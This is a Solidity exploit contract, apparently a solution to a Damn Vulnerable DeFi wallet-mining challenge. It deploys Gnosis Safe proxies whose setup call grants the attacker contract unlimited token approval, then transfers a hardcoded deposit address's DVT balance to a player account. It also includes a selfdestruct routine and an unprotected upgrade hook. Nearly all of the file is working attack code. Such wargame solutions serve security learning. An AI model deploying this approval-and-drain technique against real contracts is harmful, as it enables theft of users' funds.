// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface IGnosisSafeProxyFactory {
  function createProxy(address masterCopy, bytes calldata data) external returns (address);
}

contract AttackWMApprove {
  function kekApprove(address _addr, address token) external {
    IERC20(token).approve(_addr,type(uint256).max);
  }
}

contract AttackWM is UUPSUpgradeable {
  IGnosisSafeProxyFactory public constant fact = IGnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
  address public constant copy = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;
  address constant DEPOSIT_ADDRESS = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
  address immutable player;
  address immutable DVT;

  constructor (address _player, address _DVT) {
    player = _player;
    DVT = _DVT;
  }
    
  function kek() public returns (address target) {
    AttackWMApprove AWMA = new AttackWMApprove();
    bytes memory data = abi.encodeWithSelector(AWMA.kekApprove.selector, address(this), DVT);
    address[] memory owners = new address[](1);
    owners[0] = address(this);  
    bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,owners,1,address(AWMA),data,address(0),address(0),0,address(0));
    target = fact.createProxy(copy, init);
    if (target == DEPOSIT_ADDRESS) {
      IERC20(DVT).transferFrom(target,player,IERC20(DVT).balanceOf(target));
    }
    return target;
  }

  function kekKill() public {
    selfdestruct(payable(address(0)));
  }

  function getKeccak() public pure returns (bytes4) {
    return bytes4(keccak256("kekKill()"));
    //return bytes4(keccak256("can(address,address)"));
  }

  function _authorizeUpgrade(address newImplementation) internal virtual override {}
}

